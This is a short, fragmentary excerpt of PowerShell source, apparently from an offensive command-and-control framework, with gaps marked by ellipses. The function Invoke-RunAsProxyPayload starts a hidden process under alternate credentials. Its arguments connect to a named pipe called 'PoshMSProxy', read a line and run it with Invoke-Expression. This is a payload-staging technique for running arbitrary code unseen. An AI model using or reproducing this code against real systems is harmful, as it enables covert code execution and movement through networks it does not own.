...
.EXAMPLE
    ...
    Start a new process locally with alternate creds
#>
Function Invoke-RunAsProxyPayload
{
...
$procstartinfo.Arguments = " -c `$pi = new-object System.IO.Pipes.NamedPipeClientStream('PoshMSProxy'); `$pi.Connect(); `$pr = new-object System.IO.StreamReader(`$pi); iex `$pr.ReadLine();"
$procstartinfo.CreateNoWindow = $True
